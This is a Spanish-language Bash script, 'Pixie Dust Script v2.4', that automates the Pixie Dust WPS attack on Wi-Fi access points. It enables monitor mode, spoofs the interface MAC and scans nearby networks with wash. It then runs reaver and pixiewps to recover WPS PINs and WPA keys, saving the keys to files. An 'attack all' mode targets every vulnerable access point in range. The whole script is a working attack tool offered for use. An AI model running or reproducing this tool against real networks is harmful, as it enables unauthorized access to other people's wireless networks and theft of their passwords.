#!/bin/bash
# VERSION DEL SCRIPT
VERSION="v2.4"

# Secuencias de colores
ESC_SEQ="\x1b["
COL_RESET=$ESC_SEQ"39;49;00m"
ROJO=$ESC_SEQ"31;01m"
VERDE=$ESC_SEQ"32;01m"
AMARILLO=$ESC_SEQ"33;01m"
AZUL=$ESC_SEQ"34;01m"
CYAN=$ESC_SEQ"36;01m"

# Para saber si hemos elegido ya una interface para ponerla en modo monitor, así si cambiamos o repetimos el tipo de ataque no se nos volverá a pedir que tarjeta queremos tener en modo monitor
HEMOS_ELEGIDO_INTERFACE="NO"
# Para saber si hemos matado procesos y lanzarlos al salir
HEMOS_MATADO_PROCESOS="NO"

# Directorio de los logs 
CARPETA_LOGS=`pwd`"/LOGS/"
# Directorio para los scripts
CARPETA_SCRIPTS=`pwd`"/SCRIPTS/"
# CARPETA PARA LAS KEYS RECUPERADAS
CARPETA_KEYS=`pwd`"/PIXIESCRIPT_KEYS/"
# Log wash
WASH_LOG=$CARPETA_LOGS"WASH.LOG"
WASH_SORT_LOG=$CARPETA_LOGS"WASH_SORT.LOG"
# Log varios
ARCHIVO_LOG=$CARPETA_LOGS"VARIOS.LOG"
# Guarda temporalmente las macs probadas en los que reaver fallo
SIN_DATOS=`pwd`"/LOGS/SINDATOS.LOG"
# Guarda temporalmente las macs probadas en los que pixiewps fallo
PROBADAS=`pwd`"/LOGS/PROBADAS.LOG"

# MENU PRINCIPAL DEL PROGRAMA
menu() {
clear
echo -e $CYAN"Pixie Dust Script $VERSION por 5.1"$COL_RESET
echo ""
echo -e $VERDE"  1. Listar MACs vulnerables conocidas"
echo ""
echo -e "  2. Atacar un AP concreto"
echo ""
echo -e "  3. Atacar APs al alcance"
echo ""
echo -e "  4. Salir"$COL_RESET
echo ""
echo -en $CYAN"Selecciona una opción y pulsa ENTER: "$COL_RESET
read accion
case $accion in
    1) listar_macs_vulnerables 
       ;;
    2) ataque_individual
       ;;
    3) ataque_completo
       ;;
    4) limpiar
       ;;
    *) menu
       ;;
esac
}
# CONSULTA EN EL ARCHIVO DATABASE Y MUESTRA LOS BSSID AFECTADOS CONOCIDOS
listar_macs_vulnerables() {
clear
$CARPETA_SCRIPTS./database v
echo ""
echo -en $CYAN"Pulsa ENTER para volver al menú ... "$COL_RESET
read  
menu
}
# SI ATACAMOS A UN SOLO AP
ataque_individual() {
if [ $HEMOS_ELEGIDO_INTERFACE = "NO" ]
then
  desactivar_todos_monX
  seleccionar_tarjeta
  activar_modo_monitor
  if [ $MONITOR_ACTIVADO != "SI" ]
  then
    echo -e $ROJO"Error poniendo en modo monitor la interface elegida" $COL_RESET
    menu
  fi
  HEMOS_ELEGIDO_INTERFACE="SI"
  cambiar_mac
fi
tiempo_reaver
datos_ap_atacar
if [ $todo_ok -eq 1 ]
then
  menu
fi
MODO_AUTOMATICO="NO"
atacar_ap
echo
echo -e $AMARILLO"ATAQUE FINALIZADO, PULSA ENTER PARA VOLVER AL MENU"$COL_RESET
read
menu
}
ataque_completo() {
if [ $HEMOS_ELEGIDO_INTERFACE = "NO" ]
then
  desactivar_todos_monX
  seleccionar_tarjeta
  activar_modo_monitor
  if [ $MONITOR_ACTIVADO != "SI" ]
  then
    echo -e $ROJO"Error poniendo en modo monitor la interface elegida" $COL_RESET
    menu
  fi
  HEMOS_ELEGIDO_INTERFACE="SI"
  cambiar_mac
fi


tiempo_wash
tiempo_reaver
lanzar_wash
analizar_wash_log
}
##################################################################
## PARTE DEL SCRIPT PARA MANEJAR INTERFACES basdo en GoyScript  ##
##################################################################
desactivar_todos_monX() {
INTERFACES_MONITOR=`iwconfig --version | grep "Recommend" | awk '{print $1}' | grep mon`
let CUANTAS=`echo $INTERFACES_MONITOR | wc -w`
let CONT=1
while [ $CONT -le $CUANTAS ]
do
	MON=`echo $INTERFACES_MONITOR | awk '{print $'$CONT'}'`
	airmon-ng stop $MON > /dev/null 2>&1
	let CONT=$CONT+1
done
}
seleccionar_tarjeta() {
clear
TARJETAS_WIFI_DISPONIBLES=`iwconfig --version | grep "Recommend" | awk '{print $1}' | sort`
N_TARJETAS_WIFI=`echo $TARJETAS_WIFI_DISPONIBLES | awk '{print NF}'`
if [ "$TARJETAS_WIFI_DISPONIBLES" = "" ]
then
	echo -e $ROJO"ERROR: No se detectó ninguna tarjeta WiFi"$COL_RESET
	echo ""
	echo -en $CYAN"Pulsa ENTER para salir ... "$COL_RESET
	read
	limpiar
else
	echo -e $CYAN"Tarjetas WiFi disponibles:"$COL_RESET
	echo -e $AMARILLO
	let x=1
	while [ $x -le $N_TARJETAS_WIFI ]
	do
		INTERFAZ=`echo $TARJETAS_WIFI_DISPONIBLES | awk '{print $'$x'}'`
		DRIVER=`ls -l /sys/class/net/$INTERFAZ/device/driver | sed 's/^.*\/\([a-zA-Z0-9_-]*\)$/\1/'`
		
		TOTAL=`echo $TOTAL $x" "$INTERFAZ" "$DRIVER"\n"`
		x=$((x+1))
	done
	
	(echo -e "Nº INTERFACE DRIVER"$COL_RESET ; echo -e $TOTAL ) | column -t
	
	if [ $N_TARJETAS_WIFI -gt 1 ] 
	then
		echo -e "\n\n""$CYAN""Selecciona una tarjeta WiFi:\c"$COL_RESET
		echo -e "\c"
		read OPCION
		while [[ $OPCION < 1 ]] || [[ $OPCION > $N_TARJETAS_WIFI ]]
		do
			echo -en $ROJO"\aOPCIÓN NO VÁLIDA"$COL_RESET
			sleep 1
			echo -en $CYAN"\rSelecciona una tarjeta WiFi: \c"$COL_RESET
			read OPCION
		done
	else
		OPCION=1
	fi
fi

if [ $N_TARJETAS_WIFI -gt 1 ] 
then
	INTERFAZ=`echo $TARJETAS_WIFI_DISPONIBLES | awk '{print $'$OPCION'}'`
	echo -e "\n"
	echo -e $AMARILLO"Has seleccionado: "$INTERFAZ $COL_RESET
	echo
else
	echo
	echo -e $AMARILLO"Sólo se ha detectado una tarjeta WiFi: "$INTERFAZ $COL_RESET
	echo
fi
}
activar_modo_monitor() {
reiniciar_interface
matar_procesos
echo ""
echo -e $AMARILLO"Iniciando modo monitor para "$INTERFAZ$COL_RESET
airmon-ng start $INTERFAZ &> $ARCHIVO_LOG
lineas_log=`cat $ARCHIVO_LOG | wc -l`
for A in `seq 1 $lineas_log` ; do
  linea=`head -$A $ARCHIVO_LOG | tail -1`
  if [[ $linea == *enabled* ]]
  then 
    INTERFACE_MONITOR=`echo $linea | awk {' print $5 '} | sed 's/)//g'`
    MONITOR_ACTIVADO="SI" 
    echo -e $AMARILLO"Modo monitor activado en " $INTERFACE_MONITOR  $COL_RESET
    break
  else
    MONITOR_ACTIVADO="NO"
  fi
done 
}
matar_procesos() {
PROCESOS=`ps -A | grep -e dhcpcd -e NetworkManager -e wpa_supplicant | grep -v grep`
if [ "$PROCESOS" != "" ]
then
  echo -e $AMARILLO"Se han encontrado procesos que podrian interferir en el funcionamiento de la tarjeta de red en modo monitor"$COL_RESET
  echo ""
  echo -e $PROCESOS | awk '{ print $4 $8 $12 }'
  echo ""
  echo -en $CYAN"¿ Deseas detenerlos (s/n) ?"$COL_RESET
  read decison_matar_procesos
  while [[ $decison_matar_procesos != "s" && $decison_matar_procesos != "S" && $decison_matar_procesos != "n" && $decison_matar_procesos != "N" ]]
  do
    echo ""
    echo -e $ROJO"OPCIÓN NO VÁLIDA"$COL_RESET
    echo -en $AMARILLO"¿ Deseas detenerlos (s/n) ?" $COL_RESET
    read decison_matar_procesos
  done
  
  if [[ $decison_matar_procesos = "s"  ||  $decison_matar_procesos = "S" ]]
  then
    echo ""
    echo -e $AMARILLO"\nDeteniendo NetworkManager"$COL_RESET
    /etc/rc.d/rc.networkmanager stop
    echo -en $AMARILLO"Deteniendo dhcpcd ...."$COL_RESET
    pid_proceso=`ps -A | grep dhcpcd | awk '{ print $1 }'`
    if [ -n $pid_proceso ]
    then
      kill pid_proceso &> /dev/null
    fi
    echo -e $AMARILLO"Ok"$COL_RESET
    echo -en $AMARILLO"Deteniendo wpa_supplicant .... "$COL_RESET
    pid_proceso=`ps -A | grep wpa_supplicant | awk '{ print $1 }'`
    if [ -n $pid_proceso ]
    then
      kill -9 $pid_proceso &> /dev/null
    fi
    echo -e  $AMARILLO"Ok"$COL_RESET
    HEMOS_MATADO_PROCESOS="SI"
  else
    HEMOS_MATADO_PROCESOS="NO"
  fi
fi
desactivar_todos_monX
}
reiniciar_interface() {
DRIVER=`ls -l /sys/class/net/$INTERFAZ/device/driver | awk -F '/' '{print $NF}'`
echo -e $AMARILLO"Reiniciando la interfaz $INTERFAZ $DRIVER..."$COL_RESET
echo ""
rmmod -f "$DRIVER" >/dev/null 2>&1 #reiniciamos la interfaz
if [ "$DRIVER" = "ath9k_htc" ]
then
	ifconfig $INTERFAZ >/dev/null 2>&1
	while [ $? -eq 0 ] #esperamos a que se desactive el módulo de la interfaz
	do
		ifconfig $INTERFAZ >/dev/null 2>&1
	done
fi
modprobe "$DRIVER" >/dev/null 2>&1
if [ "$DRIVER" = "ath9k_htc" ]
then
	ifconfig $INTERFAZ >/dev/null 2>&1
	while [ $? -ne 0 ] #esperamos a que se active el módulo de la interfaz
	do
		ifconfig $INTERFAZ >/dev/null 2>&1
	done
fi
}
##################################################################
#####  CAMBIO Y VALIDACION DE MAC ADRESS                      ####
##################################################################
cambiar_mac() {
echo 
echo -en $CYAN"Quieres cambiar la MAC de $INTERFACE_MONITOR ? (s/n)"$COL_RESET
read cambiar
while [[ $cambiar != "s" && $cambiar != "S" && $cambiar != "n" && $cambiar != "N" ]]
do
  echo 
  echo -e $ROJO"Opción incorrecta"$COL_RESET
  echo -en $CYAN"Quieres cambiar la MAC de "$INTERFACE_MONITOR "? (s/n)"$COL_RESET
  read cambiar
done
if [ $cambiar = "s" ] || [ $cambiar = "S" ]
then
  echo 
  echo -e $VERDE"1. De forma aleatoria"$COL_RESET
  echo -e $VERDE"2. De forma manual"$COL_RESET
  echo ""
  echo -en $CYAN"Cómo quieres cambiarla (1/2)"$COL_RESET
  read como_cambiar
   while [[ -z $como_cambiar || $como_cambiar != "1" && $como_cambiar != "2" ]] 
   do
    echo 
    echo -en $ROJO"Opción incorrecta"$COL_RESET$CYAN", seleciona 1 para cambio aleatorio o 2 para manual "$COL_RESET
    read como_cambiar 
  done
  case $como_cambiar in
    1) cambio_mac_random
       ;;
    2) echo 
       echo -e $CYAN"Introduce la MAC deseada y pulsa ENTER : "$COL_RESET
       read  MAC_A_VALIDAR
       validar_mac
       while [ $mac_correcta -eq 1 ] 
       do
	  echo -e $ROJO"Error en el formato de la MAC intorducida"$COL_RESET
	  echo -e $CYAN"Introduce la MAC deseada y pulsa ENTER : "$COL_RESET
	  read  MAC_A_VALIDAR
	  validar_mac
       done
       cambio_mac_manual
       ;;
  esac
  echo 
  ifconfig $INTERFACE_MONITOR
  echo 
  echo -e $CYAN"Pulsa ENTER para continuar"$COL_RESET
  read
else
  echo 
fi
}
cambio_mac_random() {
ifconfig $INTERFACE_MONITOR down
macchanger -a $INTERFACE_MONITOR 
ifconfig $INTERFACE_MONITOR up
}
cambio_mac_manual () {
ifconfig $INTERFACE_MONITOR down
macchanger -m $MAC $INTERFACE_MONITOR 
ifconfig $INTERFACE_MONITOR up
}
validar_mac() {
let mac_correcta=1
if [ -z $MAC_A_VALIDAR ] || [ "${#MAC_A_VALIDAR}" != 17 ]
then
  let mac_correcta=1
  return 
fi

for ((i=1; i<=17; i++)); do
    caracter=`expr substr $MAC_A_VALIDAR $i 1`
    case $i in
      3|6|9|12|15) if [ $caracter != ":" ]; then  
		    let mac_correcta=1
		    return
		   fi  
		   ;;
      2) if [[ $caracter =~ [ACEace02468] ]]; then 
					let mac_correcta=0
				     else
					let mac_correcta=1
					return 
				     fi
				     ;;
      1|4|5|7|8|10|11|13|14|16|17) if [[ $caracter =~ [A-Fa-f0-9] ]]; then 
					let mac_correcta=0
				     else
					let mac_correcta=1
					return 
				     fi
				     ;;
    esac
done
}
##################################################################
#####  RECOGE LOS DATOS PROPORCIONADOS POR EL USUARIO         ####
##################################################################
tiempo_reaver() {
echo ""
echo -en $CYAN"Introduce el tiempo máximo en segundos que reaver estará intentando probar un pin : "$COL_RESET
read TIEMPO_REAVER
es_numero=`[[ $TIEMPO_REAVER =~ ^[0-9]*$ ]] ; echo $?`

if [ -z $TIEMPO_REAVER ] || [ $es_numero = 1 ]
then
  echo -e $ROJO"Error, el valor introducido no es correcto, se aplicará el valor por defecto (40)"$COL_RESET
  TIEMPO_REAVER=40
  echo -e $CYAN"Pulsa ENTER para continuar"$COL_RESET
  read
fi
}
tiempo_wash() {
echo ""
echo -en $CYAN"Introduce el tiempo en segundos que wash estará intentando encontrar objetivos : "$COL_RESET
read TIEMPO_WASH
es_numero=`[[ $TIEMPO_WASH =~ ^[0-9]*$ ]] ; echo $?`
if [ -z $TIEMPO_WASH ] || [ $es_numero -eq 1 ]
then
  echo -e $ROJO"Error, el valor introducido no es correcto, se aplicará el valor por defecto (40)"$COL_RESET
  TIEMPO_WASH=40
  echo -e $CYAN"Pulsa ENTER para continuar"$COL_RESET
  read
fi
}
datos_ap_atacar() {
let todo_ok=1
echo ""
echo ""
echo -en $CYAN"Introduce el BSSID a atacar: "$COL_RESET
read mac_a_atacar
MAC_A_VALIDAR=$mac_a_atacar
validar_mac
if [ $mac_correcta -eq 1 ] 
then
  echo -e $ROJO"Error en el formato de la MAC introducida, pulsa ENTER para volver al menú"$COL_RESET
  read
  return $todo_ok
fi
echo -en $CYAN"Introduce el ESSID a atacar: "$COL_RESET
read nombre
echo -en $CYAN"Introduce el canal : "$COL_RESET
read canal
es_numero=`[[ $canal =~ ^[0-9]*$ ]] ; echo $?`

while [ -z $canal ] || [ $es_numero = 1 ]
do
  echo -e $ROJO"Error, el canal introducido no es correcto"$COL_RESET
  echo -en $CYAN"Introduce el canal : "$COL_RESET
  read canal
  es_numero=`[[ $canal =~ ^[0-9]*$ ]] ; echo $?`
done
let todo_ok=0
}
##################################################################
#####       PROCESO DE ATAQUE                               ######
##################################################################
esperar_acabar_reaver() {
for A in `seq 1 $TIEMPO_REAVER` ; do
  sleep 1s
  pid_reaver=`ps -A | grep reaver | awk '{ print $1 }'`
  if [ -n "$pid_reaver" ]
  then
    if [ $A -eq $TIEMPO_REAVER ]
    then
      if [ $vez -eq 1 ] 
      then
	echo -e $ROJO"NO SE HAN PODIDO OBTENER LOS DATOS NECESARIOS DE $nombre, ATAQUE REAVER FALLIDO"$COL_RESET
      else
	echo -e $ROJO"NO SE HAN PODIDO RECUPERAR LA CLAVE WPA DE $nombre"$COL_RESET
      fi
      echo ""
      matar_reaver
      let todo_ok=1
      return $todo_ok
    else
      TIEMPO_RESTANTE=`expr $TIEMPO_REAVER - $A`
      
      if [ $vez -eq 1 ]; then clear; fi
      if [ $vez -eq 1 ]; then echo -e $AMARILLO"REAVER TRABAJANDO CON BSSID $mac_a_atacar, ESSID $nombre ESPERA $TIEMPO_RESTANTE s ..."$COL_RESET; fi
      if [ $vez -eq 1 ]; then if [ $DEBUG = "SI" ]; then cat $ARCHIVO_LOG; fi ; fi
      if [[ $vez -eq 2 && $DEBUG = "SI" ]]
      then
	let B=`expr $A-1`
	ultima_linea=`head -$B $ARCHIVO_LOG | tail -1`
	nueva_linea=`head -$A $ARCHIVO_LOG | tail -1`
	if [[ -n "$nueva_linea" && "$nueva_linea" != "$ultima_linea" ]]
	then 
	  echo $nueva_linea
	fi
      fi
    fi
  else
    let todo_ok=0
    return $todo_ok
  fi
done
}
matar_reaver() {
pid_reaver=`ps -A | grep reaver_pixie | awk '{ print $1 }'`
kill $pid_reaver &> /dev/null 
}
extraer_datos_reaver() {
let todo_ok=1
echo -e $AMARILLO"EXTRAYENDO DATOS ..."$COL_RESET
TOTAL=`cat $ARCHIVO_LOG | wc -l`
for A in `seq 1 $TOTAL` ; do
  linea=`head -$A $ARCHIVO_LOG | tail -1`
  if [[ $linea == *PKe* ]]
  then
  PKe=`echo $linea | awk 'BEGIN{FS=":"}{print $NF}'`
  PKe=`echo $PKe | sed 's/ /:/g'`
  fi
  
  if [[ $linea == *PKr* ]]
  then
  PKr=`echo $linea | awk 'BEGIN{FS=":"}{print $NF}'`
  PKr=`echo $PKr | sed 's/ /:/g'`
  fi
  
  if [[ $linea == *E-Hash1* ]]
  then
  EHash1=`echo $linea | awk 'BEGIN{FS=":"}{print $NF}'`
  EHash1=`echo $EHash1 | sed 's/ /:/g'`
  fi
  
  if [[ $linea == *E-Hash2* ]]
  then
  EHash2=`echo $linea | awk 'BEGIN{FS=":"}{print $NF}'`
  EHash2=`echo $EHash2 | sed 's/ /:/g'`
  fi
  
  if [[ $linea == *AuthKey* ]]
  then
  AuthKey=`echo $linea | awk 'BEGIN{FS=":"}{print $NF}'`
  AuthKey=`echo $AuthKey | sed 's/ /:/g'`
  fi
  
  if [[ $linea == *E-Nonce* ]]
  then
  Enrollee=`echo $linea | awk 'BEGIN{FS=":"}{print $NF}'`
  Enrollee=`echo $Enrollee | sed 's/ /:/g'`
  fi
done

  if [ -z $PKr ] 
  then
    echo -e $ROJO"NO SE HAN PODIDO OBTENER LA CLAVE PKR"$COL_RESET
    let todo_ok=1
    return $todo_ok
  fi
  if [ -z $PKe ] 
  then
    echo -e $ROJO"NO SE HAN PODIDO OBTENER LA CLAVE PKE"$COL_RESET
    let todo_ok=1
    return $todo_ok
  fi
  if [ -z $EHash1 ] 
  then
    echo -e $ROJO"NO SE HAN PODIDO OBTENER LA CLAVE EHASH1"$COL_RESET
    let todo_ok=1
    return $todo_ok
  fi
  if [ -z $EHash2 ] 
  then
    echo -e $ROJO"NO SE HAN PODIDO OBTENER LA CLAVE EHASH2"$COL_RESET
    let todo_ok=1
    return $todo_ok
  fi
  if [ -z $AuthKey ] 
  then
    echo -e $ROJO"NO SE HAN PODIDO OBTENER LA CLAVE AUTHKEY"$COL_RESET
    let todo_ok=1
    return $todo_ok
  fi
  if [ -z $Enrollee ] 
  then
    echo -e $ROJO"NO SE HAN PODIDO OBTENER LA CLAVE Enrollee Nonce"$COL_RESET
    let todo_ok=1
    return $todo_ok
  fi
  
echo -e "PKr    :"$VERDE $PKr $COL_RESET
echo -e "PKe    :"$VERDE $PKe $COL_RESET
echo -e "EHASH1 :"$VERDE $EHash1 $COL_RESET
echo -e "EHASH2 :"$VERDE $EHash2 $COL_RESET
echo -e "AuthKey:"$VERDE $AuthKey $COL_RESET
echo -e "E-Nonce:"$VERDE $Enrollee $COL_RESET
let todo_ok=0
return $todo_ok
}
lanzar_pixiewps() {
echo ""
echo -e $AMARILLO"PROBANDO CON PIXIEWPS 1.0 by wiire"$COL_RESET
pixiewps -e $PKe -r $PKr -s $EHash1 -z $EHash2 -a $AuthKey -n $Enrollee &> $ARCHIVO_LOG
cat $ARCHIVO_LOG
analizar_log_pixiewps
}
analizar_log_pixiewps() {
lineas_log=`cat $ARCHIVO_LOG | wc -l`
let A=0
for A in `seq 1 $lineas_log` ; do 
    linea=`head -$A $ARCHIVO_LOG | tail -1`
  if [[ $linea == *"WPS pin"* ]] 
  then 
    if [[ $linea == *"not found"* ]]
    then
     if [ ! -f $PROBADAS ];then touch $PROBADAS;fi
     if [ ! `grep -r $mac_a_atacar $PROBADAS` ]
     then
	  echo $mac_a_atacar >> $PROBADAS
     fi
     return
    fi
    PIN_WPS=`echo $linea | awk -F":" {' print $2 '} `
    echo -e $AMARILLO"Recuperando clave WPA, espera ..."$COL_RESET
    reaver_pixie -i $INTERFACE_MONITOR -b $mac_a_atacar -a -D -c $canal -p $PIN_WPS &> $ARCHIVO_LOG
    let vez=2
    esperar_acabar_reaver
    if [ $todo_ok = 0 ]
    then
      cat $ARCHIVO_LOG
      recuperar_clave_wpa
    else
      CLAVE_WPA="NO SE HA PODIDO RECUPERAR LA CLAVE WPA"
    fi
    echo "ESSID   : "$nombre > $CARPETA_KEYS$nombre".datos"
    echo "BSSID   : "$mac_a_atacar  >> $CARPETA_KEYS$nombre".datos"
    echo "PIN WPS : "$PIN_WPS >> $CARPETA_KEYS$nombre".datos"
    echo "KEY WPA : "$CLAVE_WPA >> $CARPETA_KEYS$nombre".datos"
    echo ""
    echo -e $AMARILLO"PIN Y CLAVE WPA VOLCADOS AL ARCHIVO " $nombre".datos"$COL_RESET
    agregar_mac_vulnerable
  fi 
done
}
recuperar_clave_wpa() {
lineas_log=`cat $ARCHIVO_LOG | wc -l`
let A=0
for A in `seq 1 $lineas_log` ; do 
  linea=`head -$A $ARCHIVO_LOG | tail -1`
  if [[ $linea == *"WPA PSK"* ]] 
  then 
    CLAVE_WPA=`echo $linea | awk -F":" {' print $2 '}` 
    CLAVE_WPA=`echo $CLAVE_WPA | awk -F"'" {' print $2 '}`
  fi
done
}
datos_router() {
datos=$CARPETA_LOGS"datos"
rm $datos* &> /dev/null
echo ""
echo -e $AMARILLO"Capturando datos del AP, espera 5 segundos"$COL_RESET
(airodump-ng --bssid $mac_a_atacar --channel $canal --manufacturer -w $datos mon0 &> /dev/null &)
sleep 5
killall airodump-ng
delimitador="<{manuf>"
fabricante=`cat $datos-01.kismet.netxml | grep "<manuf>" | sed 's/\///g' | sed 's/<manuf>//g'`
rm datos* &> /dev/null
}
agregar_mac_vulnerable() {
ESTA_EN_DATABASE=`$CARPETA_SCRIPTS./database b $mac_a_atacar`
if [ $ESTA_EN_DATABASE = "NO" ] 
then
  $CARPETA_SCRIPTS./database a $mac_a_atacar $fabricante $nombre
  echo -e $AMARILLO"AP AÑADIDO A LA BASE DE DATOS"$COL_RESET
else
  echo -e $AMARILLO"EL AP YA ESTABA EN LA BASE DE DATOS, NO SE AÑADIRA"$COL_RESET
fi
}
lanzar_wash() {
rm $WASH_LOG &> /dev/null
clear
wash -C -D -i $INTERFACE_MONITOR &> $WASH_LOG
echo -e $AMARILLO"BUSCANDO OBJETIVOS CON WASH, ESPERA "$TIEMPO_WASH" s ..."$COL_RESET
let A=0
for A in `seq 1 $TIEMPO_WASH` ; do
  sleep 1s
  if [ $A -eq $TIEMPO_WASH ]
  then
    PID_WASH=`ps -A | grep wash | awk '{ print $1}'`
    kill $PID_WASH
  else
    clear
    TIEMPO_RESTANTE=`expr $TIEMPO_WASH - $A`
    echo -e  $AMARILLO"BUSCANDO OBJETIVOS CON WASH, ESPERA "$TIEMPO_RESTANTE" s ..."$COL_RESET
    echo ""
  fi
done
}
cat_wash_log() {
clear
echo -e $ROJO"PROBADAS Y NO VULNERABLES"$COL_RESET$AMARILLO"  PROBADAS PERO SIN CONSEGUIR DATOS PARA EL ATAQUE"$COL_RESET$VERDE"  VULNERABLES"$COL_RESET"  NO PROBADAS"
echo""
# ELIMINO CABECERAS Y ORDENO POR INTENSIDAD DE SEÑAL
sed '1,6d' $WASH_LOG | sort -t"-" -k2n > $WASH_SORT_LOG
echo -e $CYAN"Nº  BSSID               Channel    RSS  WPS Version Locked    ESSID"$COL_RESET
echo -e $CYAN"---------------------------------------------------------------------------"$COL_RESET
let contador=1
cat $WASH_SORT_LOG |\
    while read LINE; do
      espacios=""
      if [ $contador -gt 0 ] && [ $contador -lt 10 ]; then espacios="   "; fi
      if [ $contador -gt 9 ] && [ $contador -lt 100 ]; then espacios="  "; fi
      if [ $contador -gt 99 ] && [ $contador -lt 1000 ]; then espacios=" "; fi
    
      MAC_WASH="${LINE:0:17}"
      ESTA_EN_DATABASE=`$CARPETA_SCRIPTS./database b $MAC_WASH`
      
      if [ ! -f $PROBADAS ];then touch $PROBADAS;fi
      if [ ! -f $SIN_DATOS ];then touch $SIN_DATOS;fi
      
      if [ $ESTA_EN_DATABASE = "SI" ] 
      then
	echo -e "$VERDE$contador$espacios$LINE$COL_RESET"
      else
	if [ `grep -r $MAC_WASH $PROBADAS` ]
	then
	  echo -e "$ROJO$contador$espacios$LINE$COL_RESET"
	else
	  if [ `grep -r $MAC_WASH $SIN_DATOS` ]
	  then
	    echo -e "$AMARILLO$contador$espacios$LINE$COL_RESET"
	  else
	    echo "$contador$espacios$LINE"
	  fi
	fi
      fi
      let contador=$contador+1
    done
}
analizar_wash_log() {
clear
cat_wash_log
echo ""
echo -en $CYAN"Elige número de BSSID, pulsa T para atacarlas todas automaticamente, M para volver al menú principal" $COL_RESET
read decision

#if [ -z $decision ];then analizar_wash_log;fi

if [ -z $decision ]
then 
  analizar_wash_log
fi

maximo=`wc -l $WASH_SORT_LOG | awk {' print $1 '}`

while [[ $decision != "m" && $decision != "M" && $decision != "t" && $decision != "T" && $decision -lt 1 && $decision -gt $maximo ]]
do
	echo ""
	echo -e $ROJO"OPCIÓN NO VÁLIDA"$COL_RESET
	sleep 1
	echo -en $CYAN"Elige número de BSSID, pulsa T para atacarlas todas automaticamente, M para volver al menú principal" $COL_RESET
	read decision
done


if [[ $decision = "m" || $decision = "M" ]]; then
    menu
elif [[ $decision = "t" || $decision = "T" ]]; then
    echo
    MODO_AUTOMATICO="SI"
    ataque_automatico
elif [[ $decision -ge 1 && $decision -le $maximo ]]; then
    MODO_AUTOMATICO="NO"
    atacar_ap_aut
    echo -e $CYAN"Ataque finalizado, pulsa ENTER para continuar"$COL_RESET
    read
fi

analizar_wash_log
}
ataque_automatico() {
for MA in `seq 1 $maximo` ; do
  let decision=$MA
  atacar_ap_aut
done
}
atacar_ap_aut() {

mac_a_atacar=`head -$decision $WASH_SORT_LOG | tail -1 | awk '{ print $1 }'`
canal=`head -$decision $WASH_SORT_LOG | tail -1 | awk '{ print $2 }'`
locked=`head -$decision $WASH_SORT_LOG | tail -1 | awk '{ print $5 }'`
nombre=`head -$decision $WASH_SORT_LOG | tail -1 | awk '{ print $6 }'`
  
control_espacio_blanco=`head -$decision $WASH_SORT_LOG | tail -1 | awk '{ print $7 }'`
let esp=8
while [ $control_espacio_blanco ]
do
     nombre=`echo $nombre" "$control_espacio_blanco`
     control_espacio_blanco=`head -$decision $WASH_SORT_LOG | tail -1 | awk -v i=$esp '{ print $i }'`
     let esp=$esp+1
done

if [ $locked = "Yes" ]
then
    if [ $MODO_AUTOMATICO = "NO" ]
    then
      echo -e $AMARILLO"AP bloqueada, pulsa ENTER para continuar con otro AP"$COL_RESET
      read
    fi
    continue
fi
atacar_ap
}
atacar_ap() {
clear
rm $CARPETA_LOGS*.cap &> /dev/null 
ifconfig $INTERFAZ up &> /dev/null
echo -e $CYAN"LANZANDO REAVER, ESPERA "$TIEMPO_REAVER" s ..."$COL_RESET
reaver_pixie --FINALIZAR -i $INTERFACE_MONITOR -b $mac_a_atacar -c $canal -a -n -vv -D > $ARCHIVO_LOG 2> /dev/null
let vez=1
esperar_acabar_reaver
if [ $todo_ok -eq 1 ]
then
  if [ ! -f $SIN_DATOS ];then touch $SIN_DATOS;fi
  if [ ! `grep -r $mac_a_atacar $SIN_DATOS` ]
  then
    echo $mac_a_atacar >> $SIN_DATOS
  fi
  return $todo_ok
fi
extraer_datos_reaver
if [ $todo_ok -eq 1 ]
then
  if [ ! -f $SIN_DATOS ];then touch $SIN_DATOS;fi
  if [ ! `grep -r $mac_a_atacar $SIN_DATOS` ]
  then
    echo $mac_a_atacar >> $SIN_DATOS
  fi
  return $todo_ok
fi
echo ""
datos_router
echo ""
echo -e $AMARILLO"FABRICANTE : "$COL_RESET $VERDE $fabricante
echo -e $AMARILLO"BSSID      : "$COL_RESET $VERDE $mac_a_atacar
echo -e $AMARILLO"ESSID      : "$COL_RESET $VERDE $nombre
echo ""
lanzar_pixiewps
echo ""
if [ $MODO_AUTOMATICO = "N0" ] 
then
  echo -e $CYAN"Pulsa ENTER para continuar " $COL_RESET
  read 
fi
}
####################################################################
####################################################################
limpiar() {
echo""
rm $CARPETA_LOGS* &> /dev/null
killall reaver_pixie &> /dev/null
killall airodump-ng &> /dev/null
killall wash &> /dev/null
killall pixie &> /dev/null
desactivar_todos_monX
if [ -z $HEMOS_MATADO_PROCESOS ]
then
  HEMOS_MATADO_PROCESOS="NO"
fi
if [ $HEMOS_MATADO_PROCESOS = "SI" ]
then
  clear
  echo -e $AMARILLO"Lanzando procesos finalizados al poner la tarjeta en modo monitor"$COL_RESET
  /etc/rc.d/rc.networkmanager start
fi
exit 0
}
modo_debug() {
clear
echo
echo 
echo -e $AMARILLO"PIXIE SCRIPT $VERSION POR 5.1"$COL_RESET
echo
echo -en $ROJO"QUIERES ACTIVAR EL MODO DEBUG (S/N)"$COL_RESET
read MODO
case $MODO in
  s|S) DEBUG="SI"
	 ;;
  n|N) DEBUG="NO"
	 ;;
      *) modo_debug
	 ;;
esac
}

trap limpiar SIGHUP SIGINT
#trap salir SIGSTOP # control z
rm $CARPETA_LOGS* &> /dev/null
modo_debug
menu